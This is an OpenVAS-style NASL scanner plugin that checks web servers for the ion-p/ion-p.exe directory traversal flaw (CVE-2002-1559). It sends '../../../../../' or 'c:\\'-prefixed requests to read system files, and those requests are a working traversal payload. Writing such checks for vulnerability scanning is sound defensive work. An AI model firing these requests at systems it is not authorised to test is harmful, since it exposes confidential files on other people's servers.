if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.11729" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_bugtraq_id( 6091 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_cve_id( "CVE-2002-1559" );
	script_name( "ion-p/ion-p.exe Directory Traversal Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2003 John Lampe" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "summary", value: "The ion-p.exe exists on this webserver.
  Some versions of this file are vulnerable to remote exploit." );
	script_tag( name: "impact", value: "An attacker, exploiting this vulnerability, may be able to gain
  access to confidential data and/or escalate their privileges on the Web server." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
if( os_host_runs( "windows" ) == "yes" ){
	files = traversal_files( "windows" );
	prefix = "c:\\\\";
	check_file = "/ion-p.exe?page=";
	check_os = "windows";
}
else {
	if( os_host_runs( "linux" ) == "yes" ){
		files = traversal_files( "linux" );
		prefix = "../../../../../";
		check_file = "/ion-p?page=";
	}
	else {
		exit( 0 );
	}
}
port = http_get_port( default: 80 );
for dir in nasl_make_list_unique( "/", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	for pattern in keys( files ) {
		file = files[pattern];
		if(check_os == "windows"){
			file = str_replace( find: "/", string: file, replace: "\\\\" );
		}
		url = dir + check_file + prefix + file;
		if(http_vuln_check( port: port, url: url, pattern: pattern )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

